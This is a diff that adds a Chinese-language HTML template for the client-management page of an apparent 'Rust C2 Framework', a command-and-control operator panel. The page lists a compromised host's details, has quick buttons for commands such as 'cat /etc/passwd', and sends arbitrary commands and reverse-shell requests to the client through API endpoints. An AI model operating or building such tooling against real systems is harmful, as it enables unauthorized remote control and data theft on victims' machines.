@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="stylesheet" href="/static/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rust C2 Framework - 客户端管理</title>
+</head>
+<body>
+    <div class="container">
+        <a href="/" class="back-btn">← 返回主页</a>
+        
+        <div class="header">
+            <h1>客户端管理</h1>
+        </div>
+
+        <div class="client-info">
+            <h2>客户端信息</h2>
+            <div class="info-grid">
+                <div class="info-item">
+                    <label>客户端ID</label>
+                    <span><code>{{ client.id }}</code></span>
+                </div>
+                <div class="info-item">
+                    <label>主机名</label>
+                    <span>{{ client.hostname }}</span>
+                </div>
+                <div class="info-item">
+                    <label>用户名</label>
+                    <span>{{ client.username }}</span>
+                </div>
+                <div class="info-item">
+                    <label>操作系统</label>
+                    <span>{{ client.os }} ({{ client.arch }})</span>
+                </div>
+                <div class="info-item">
+                    <label>IP地址</label>
+                    <span>{{ client.ip }}</span>
+                </div>
+                <div class="info-item">
+                    <label>连接时间</label>
+                    <span>{{ client.connected_at.format("%Y-%m-%d %H:%M:%S") }}</span>
+                </div>
+                <div class="info-item">
+                    <label>最后活动</label>
+                    <span>{{ client.last_seen.format("%Y-%m-%d %H:%M:%S") }}</span>
+                </div>
+                <div class="info-item">
+                    <label>状态</label>
+                    <span id="client-status">
+                        <!-- 状态将通过JavaScript动态更新 -->
+                    </span>
+                </div>
+            </div>
+        </div>
+
+        <div class="command-section">
+            <h2>命令执行</h2>
+            
+            <div class="quick-commands">
+                <button class="quick-cmd" onclick="setCommand('whoami')">whoami</button>
+                <button class="quick-cmd" onclick="setCommand('pwd')">pwd</button>
+                <button class="quick-cmd" onclick="setCommand('ls -la')">ls -la</button>
+                <button class="quick-cmd" onclick="setCommand('ps aux')">ps aux</button>
+                <button class="quick-cmd" onclick="setCommand('netstat -an')">netstat -an</button>
+                <button class="quick-cmd" onclick="setCommand('uname -a')">uname -a</button>
+                <button class="quick-cmd" onclick="setCommand('cat /etc/passwd')">cat /etc/passwd</button>
+            </div>
+
+            <div class="command-form">
+                <input type="text" id="commandInput" class="command-input" placeholder="输入要执行的命令..." />
+                <button class="btn btn-primary" onclick="executeCommand()">执行</button>
+                <button class="btn btn-danger" onclick="startReverseShell()">反弹Shell</button>
+            </div>
+        </div>
+
+        <div class="results-section">
+            <h2>命令执行结果</h2>
+            <button class="btn btn-info" onclick="refreshResults()" style="float: right; margin-bottom: 20px;">刷新结果</button>
+            
+            {% if commands.is_empty() %}
+                <div class="no-results">
+                    <h3>暂无命令执行记录</h3>
+                    <p>执行命令后，结果将显示在这里</p>
+                </div>
+            {% else %}
+                {% for cmd in commands %}
+                <div class="command-result">
+                    <div class="result-header">
+                        <span class="result-command">{{ cmd.command }}</span>
+                        <span class="result-time">{{ cmd.executed_at.format("%Y-%m-%d %H:%M:%S") }}</span>
+                    </div>
+                    <div class="result-output">
+                        {% if !cmd.stdout.is_empty() %}
+                            <div class="output-stdout">{{ cmd.stdout }}</div>
+                        {% endif %}
+                        {% if !cmd.stderr.is_empty() %}
+                            <div class="output-stderr">{{ cmd.stderr }}</div>
+                        {% endif %}
+                        <div class="exit-code {% if cmd.exit_code == 0 %}success{% else %}error{% endif %}">
+                            退出码: {{ cmd.exit_code }}
+                        </div>
+                    </div>
+                </div>
+                {% endfor %}
+            {% endif %}
+        </div>
+    </div>
+
+    <script>
+        function setCommand(command) {
+            document.getElementById('commandInput').value = command;
+        }
+
+        async function executeCommand() {
+            const command = document.getElementById('commandInput').value.trim();
+            if (!command) {
+                alert('请输入命令');
+                return;
+            }
+
+            try {
+                const response = await fetch(`/api/clients/{{ client.id }}/commands`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        client_id: '{{ client.id }}',
+                        command: command,
+                        args: []
+                    })
+                });
+
+                if (response.ok) {
+                    alert('命令已发送');
+                    document.getElementById('commandInput').value = '';
+                    // 3秒后刷新结果
+                    setTimeout(refreshResults, 3000);
+                } else {
+                    alert('发送命令失败');
+                }
+            } catch (error) {
+                alert('发送命令时出错: ' + error.message);
+            }
+        }
+
+        async function startReverseShell() {
+            if (confirm('确定要启动反弹Shell吗？')) {
+                try {
+                    const response = await fetch(`/api/clients/{{ client.id }}/reverse_shell`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({}) // No body needed for this request
+                    });
+
+                    if (response.ok) {
+                        alert('反弹Shell请求已发送');
+                    } else {
+                        alert('发送反弹Shell请求失败');
+                    }
+                } catch (error) {
+                    alert('发送请求时出错: ' + error.message);
+                }
+            }
+        }
+
+        function refreshResults() {
+            location.reload();
+        }
+
+        // 回车键执行命令
+        document.getElementById('commandInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                executeCommand();
+            }
+        });
+
+        // 自动刷新结果
+        setInterval(refreshResults, 30000);
+
+        // 动态更新客户端状态
+        function updateClientStatus() {
+            const lastSeen = new Date('{{ client.last_seen.format("%Y-%m-%dT%H:%M:%SZ") }}');
+            const now = new Date();
+            const diffInSeconds = (now - lastSeen) / 1000;
+            
+            const statusElement = document.getElementById('client-status');
+            if (diffInSeconds < 60) {
+                statusElement.innerHTML = '<span style="color: #7ee787;">在线</span>';
+            } else {
+                statusElement.innerHTML = '<span style="color: #f85149;">离线</span>';
+            }
+        }
+
+        // 页面加载时更新状态
+        updateClientStatus();
+    </script>
+</body>
+</html>
